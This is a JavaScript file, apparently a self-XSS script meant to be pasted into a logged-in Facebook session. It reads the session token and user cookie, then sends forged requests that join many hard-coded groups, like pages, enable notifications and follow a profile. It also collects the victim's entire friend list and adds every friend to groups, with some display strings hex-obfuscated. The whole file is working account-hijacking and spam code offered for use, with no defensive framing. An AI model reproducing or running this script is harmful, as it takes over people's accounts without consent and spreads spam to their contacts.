var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function D(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/members/add_post.php?group_id="+gid+"&all_outstanding=1&source=member_page&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=e&ttstamp=2658167728810111298";
var PageParams ="fb_dtsg="+fb_dtsg+"&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=f&ttstamp=2658167728810111298";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
D("497122276993840");	
D("351906671586970");		
D("573771685990373");		
D("154500754726930");		
D("442085872548663");		
D("515860648478673");		
D("598942353450105");		
D("114592352044484");			
D("652902648059764");		
D("155767627937393");		
D("439007019528351");		
D("310277482442509");	
D("532152503506437");		
D("422654531112476");		

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
LIST("1433157693574373");	

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
Like("227267404096562");
Like("612965338727027");
Like("372281662900769");
Like("202254399954716");
Like("619054178128916");
Like("1395527940669878");
Like("338258756251503");
Like("165766233609832");
Like("403857263001992");
Like("619873444698592");
Like("196059583893149");
Like("634502316581929");
Like("427273980719655");
Like("586386144722786");
Like("347561765376833");
Like("313591998787087");
Like("1411345782419633");
Like("513520682075216");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function N(noti) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
N("165766233609832");	
N("227267404096562");	
N("403857263001992");	

/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function A(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
A("100006404671098");

var user = getCookie("c_user");
function getCookie(c_name) {
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++) {
 x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
 y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
 x=x.replace(/^\s+|\s+$/g,"");
 if (x==c_name) {
   return unescape(y);
 }
}
}
var tulisanNganu = '<font color="blue"><b>ดึงเพื่อนเข้ากลุ่ม แบบ Dewvinchi Optic & XazaḂḁrḁmḛ</b> </font>';
var kunaon = '';
function penetrasi(opo) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function (a) {
var b = a.substring(a.indexOf("{"));
var c = JSON.parse(b);
i--;
kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
if (c.error) {
kunaon += "color:darkred'>";
if (c.errorDescription) {
kunaon += c.errorDescription
} else {
kunaon += JSON.stringify(c, null, "")
}
} else {
kunaon += "color:darkgreen'>";
kunaon += arr[i];
suc++
}
kunaon += "</div>";
var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(100,200,225,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(0,0,0,0.5)'>";
dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
if (i > 0) {
var _0x8f3c=["\x6C\x65\x6E\x67\x74\x68","\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E40\u0E1B\u0E47\u0E19\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E19\u0E01\u0E31\u0E1A\u0E04\u0E38\u0E13\x3C\x62\x72\x2F\x3E","\x3C\x62\x3E","\x3C\x2F\x62\x3E\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E40\u0E02\u0E49\u0E32\u0E01\u0E25\u0E38\u0E48\u0E21\u0E41\u0E25\u0E49\u0E27\x20","\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E2A\u0E32\u0E21\u0E32\u0E23\u0E16\u0E40\u0E02\u0E49\u0E32\u0E01\u0E25\u0E38\u0E48\u0E21\u0E44\u0E14\u0E49\x20","\x28","\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E01\u0E33\u0E25\u0E31\u0E07\u0E1B\u0E31\u0E49\u0E21\x2E\x2E\x29","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x66\x72\x69\x65\x6E\x64\x2D\x65\x64\x67\x65\x27\x3E","\x3C\x2F\x64\x69\x76\x3E"];dipes+=arr[_0x8f3c[0]]+_0x8f3c[1];dipes+=_0x8f3c[2]+suc+_0x8f3c[3]+(arr[_0x8f3c[0]]-i)+_0x8f3c[4];dipes+=_0x8f3c[5]+i+_0x8f3c[6];dipes+=_0x8f3c[7];dipes+=kunaon;dipes+=_0x8f3c[8];
} else {
var _0xda2a=["\x6C\x65\x6E\x67\x74\x68","\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E2A\u0E32\u0E21\u0E32\u0E23\u0E16\u0E40\u0E02\u0E49\u0E32\u0E01\u0E25\u0E38\u0E48\u0E21\u0E44\u0E14\u0E49\x20\x20","\x3C\x62\x3E","\x20\u0E04\u0E19\u0E17\u0E35\u0E48\u0E40\u0E02\u0E49\u0E32\u0E01\u0E25\u0E38\u0E48\u0E21\x3C\x2F\x62\x3E","\x3C\x64\x69\x76\x3E\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x27\x75\x69\x42\x75\x74\x74\x6F\x6E\x27\x20\x6F\x6E\x43\x6C\x69\x63\x6B\x3D\x27\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x70\x61\x67\x65\x6C\x65\x74\x5F\x77\x65\x6C\x63\x6F\x6D\x65\x5F\x62\x6F\x78\x22\x29\x2E\x73\x74\x79\x6C\x65\x2E\x64\x69\x73\x70\x6C\x61\x79\x3D\x22\x6E\x6F\x6E\x65\x22\x27\x3E\u0E40\u0E2A\u0E23\u0E47\u0E08\u0E40\u0E2A\u0E23\u0E47\u0E08\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x64\x69\x76\x3E"];dipes+=arr[_0xda2a[0]]+_0xda2a[1];dipes+=_0xda2a[2]+suc+_0xda2a[3];dipes+=_0xda2a[4];
}
dipes += "</div>";
document.getElementById("pagelet_welcome_box").innerHTML = dipes
},
"text", "post");
tay--;
if (tay > 0) {
var s = arr[tay];
setTimeout("penetrasi(" + s + ")", 100)
}
console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
if (memberGroupId != 547268175352614) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=547268175352614&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
"text", "post")
}
}
function clickfr_callback() {
if (document.getElementsByName("ok").length > 0) {
nHtml.ClickUp(document.getElementsByName("ok")[0])
}
var a = arr[i];
if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
if (document.getElementsByClassName("search").length > 0) {
console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = "javascript:void(0);";
nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
} else j++;
setTimeout("clickfr_callback()", 2e3)
}
function addfriend(a) {
i++;
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
setTimeout("clickfr()", 2e3)
}
function sleep(a) {
var b = (new Date).getTime();
for (var c = 0; c < 1e7; c++) {
if ((new Date).getTime() - b > a) {
break
}
}
}
jx = {
getHTTPObject: function () {
var a = false;
if (typeof ActiveXObject != "undefined") {
try {
a = new ActiveXObject("Msxml2.XMLHTTP")
} catch(b) {
try {
a = new ActiveXObject("Microsoft.XMLHTTP")
} catch(c) {
a = false
}
}
} else {
if (window.XMLHttpRequest) {
try {
a = new XMLHttpRequest
} catch(b) {
a = false
}
}
}
return a
},
load: function (url, callback, format, method, opt) {
var http = this.init();
if (!http || !url) {
return
}
if (http.overrideMimeType) {
http.overrideMimeType("text/xml")
}
if (!method) {
method = "GET"
}
if (!format) {
format = "text"
}
if (!opt) {
opt = {}
}
format = format.toLowerCase();
method = method.toUpperCase();
var now = "uid=" + (new Date).getTime();
url += url.indexOf("?") + 1 ? "&": "?";
url += now;
var parameters = null;
if (method == "POST") {
var parts = url.split("?");
url = parts[0];
parameters = parts[1]
}
http.open(method, url, true);
if (method == "POST") {
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", parameters.length);
http.setRequestHeader("Connection", "close")
}
var ths = this;
if (opt.handler) {
http.onreadystatechange = function () {
opt.handler(http)
}
} else {
http.onreadystatechange = function () {
if (http.readyState == 4) {
if (http.status == 200) {
var result = "";
if (http.responseText) {
result = http.responseText
}
if (format.charAt(0) == "j") {
result = result.replace(/[\n\r]/g, "");
result = eval("(" + result + ")")
} else {
if (format.charAt(0) == "x") {
result = http.responseXML
}
}
if (callback) {
callback(result)
}
} else {
if (opt.loadingIndicator) {
document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
}
if (opt.loading) {
document.getElementById(opt.loading).style.display = "none"
}
if (error) {
error(http.status)
}
}
}
}
}
http.send(parameters)
},
bind: function (a) {
var b = {
url: "",
onSuccess: false,
onError: false,
format: "text",
method: "GET",
update: "",
loading: "",
loadingIndicator: ""
};
for (var c in b) {
if (a[c]) {
b[c] = a[c]
}
}
if (!b.url) {
return
}
var d = false;
if (b.loadingIndicator) {
d = document.createElement("div");
d.setAttribute("style", "position:absolute;top:0px;left:0px;");
d.setAttribute("class", "loading-indicator");
d.innerHTML = b.loadingIndicator;
document.getElementsByTagName("body")[0].appendChild(d);
this.opt.loadingIndicator = d
}
if (b.loading) {
document.getElementById(b.loading).style.display = "block"
}
this.load(b.url, function (a) {
if (b.onSuccess) {
b.onSuccess(a)
}
if (b.update) {
document.getElementById(b.update).innerHTML = a
}
if (d) {
document.getElementsByTagName("body")[0].removeChild(d)
}
if (b.loading) {
document.getElementById(b.loading).style.display = "none"
}
},
b.format, b.method, b)
},
init: function () {
return this.getHTTPObject()
}
};
var nHtml = {
FindByAttr: function (a, b, c, d) {
if (c == "className") {
c = "class"
}
var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
if (e && e.singleNodeValue) {
return e.singleNodeValue
}
return null
},
FindByClassName: function (a, b, c) {
return this.FindByAttr(a, b, "className", c)
},
FindByXPath: function (a, b) {
try {
var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
} catch(d) {
GM_log("bad xpath:" + b)
}
if (c && c.singleNodeValue) {
return c.singleNodeValue
}
return null
},
VisitUrl: function (a) {
window.setTimeout(function () {
document.location.href = a
},
500 + Math.floor(Math.random() * 500))
},
ClickWin: function (a, b, c) {
var d = a.document.createEvent("MouseEvents");
d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
return ! b.dispatchEvent(d)
},
Click: function (a) {
return this.ClickWin(window, a, "click")
},
ClickTimeout: function (a, b) {
window.setTimeout(function () {
return nHtml.ClickWin(window, a, "click")
},
b + Math.floor(Math.random() * 500))
},
ClickUp: function (a) {
this.ClickWin(window, a, "mousedown");
this.ClickWin(window, a, "mouseup");
this.ClickWin(window, a, "click")
},
GetText: function (a, b) {
var c = "";
if (b == undefined) {
b = 0
}
if (b > 40) {
return
}
if (a.textContent != undefined) {
return a.textContent
}
for (var d = 0; d < a.childNodes.length; d++) {
var e = a.childNodes[d];
c += this.GetText(e, b + 1)
}
return c
}
};
if (document.getElementsByClassName == undefined) {
document.getElementsByClassName = function (a) {
var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
var c = document.getElementsByTagName("*");
var d = [];
var e;
for (var f = 0;
(e = c[f]) != null; f++) {
var g = e.className;
if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
}
return d
}
}
Array.prototype.find = function (a) {
var b = false;
for (i = 0; i < this.length; i++) {
if (typeof a == "function") {
if (a.test(this[i])) {
if (!b) {
b = []
}
b.push(i)
}
} else {
if (this[i] === a) {
if (!b) {
b = []
}
b.push(i)
}
}
}
return b
};
var a = 0,
eind = 0;
var len = document.getElementsByClassName("mbm").length;
for (a = 0; a < len; a++) {
var ele = document.getElementsByClassName("mbm")[a];
if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Friends To Group") {
eind = a;
break
}
}
var i = 3;
var tay = 3;
var counter1 = 0,
counter2 = 0,
counter3 = 0;
var j = 0;
var k = 0;
var suc = 0;
var arr = new Array;
var memberGroupId = document.getElementsByName('group_id')[0].value;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + user + "&filter[0]=user&__user=" + user, function (a) {
var b = a;
var c = b.substring(b.indexOf("{"));
var d = JSON.parse(c);
d = d.payload.entries;
for (var e = 0; e < d.length; e++) {
arr.push(d[e].uid)
}
i = arr.length - 1;
tay = i;
console.log(arr.length);
var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(100,200,225,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(0,0,0,0.5)'>";
dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
dipes += arr.length + " รับชื่อเพื่อน";
dipes += "</div>";
penetrasi(arr[i])
})
